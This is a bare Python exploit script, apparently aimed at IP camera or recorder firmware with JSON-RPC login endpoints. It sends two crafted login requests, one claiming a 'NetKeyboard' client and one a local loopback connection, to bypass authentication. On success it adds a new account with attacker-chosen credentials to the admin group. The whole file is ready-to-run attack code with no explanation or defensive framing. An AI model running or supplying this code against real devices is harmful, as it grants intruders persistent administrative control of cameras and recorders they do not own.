import json
import sys
from urllib.request import Request, urlopen


def rpc(base, route, message):
    data = json.dumps(message).encode()
    return json.load(urlopen(Request(base + route, data=data,
        headers={"Content-Type": "application/json"})))


def run(base, name, password):
    candidates = [
        {"userName": "admin", "password": "Not Used", "clientType": "NetKeyboard", "loginType": "Direct"},
        {"userName": "admin", "password": "", "clientType": "Local", "loginType": "Loopback", "ipAddr": "127.0.0.1"},
    ]
    for params in candidates:
        response = rpc(base, "/RPC2_Login", {"method": "global.login", "params": params, "id": 1, "session": 0})
        if response.get("result") and response.get("session"):
            return rpc(base, "/RPC2", {"method": "userManager.addUser", "params": {
                "user": {"Name": name, "Password": password, "Group": "admin", "Encryption": "Plain"}},
                "session": response["session"], "id": 2})


if __name__ == "__main__":
    run(*sys.argv[1:4])
